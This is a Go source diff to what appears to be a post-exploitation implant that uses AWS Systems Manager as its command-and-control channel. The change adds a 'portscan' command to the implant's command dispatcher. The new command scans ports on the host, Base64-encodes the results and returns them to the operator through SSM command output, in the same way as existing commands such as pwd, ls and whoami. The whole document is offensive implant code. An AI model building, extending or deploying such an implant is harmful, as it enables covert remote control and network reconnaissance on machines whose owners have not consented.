@@ -15,6 +15,7 @@ import (
 	"github.com/grines/ssmmm/implant/implantls"
 	"github.com/grines/ssmmm/implant/implantps"
 	"github.com/grines/ssmmm/implant/implantutil"
+	"github.com/grines/ssmmm/implant/portscan"
 	"github.com/grines/ssmmm/implant/pwd"
 	"github.com/grines/ssmmm/implant/wd"
 	"github.com/grines/ssmmm/implant/whoami"
@@ -41,6 +42,10 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
 	case "pwd":
 		data, _ := pwd.Pwd()
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+	case "portscan":
+		data := portscan.Portscan()
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
 	case "ls":
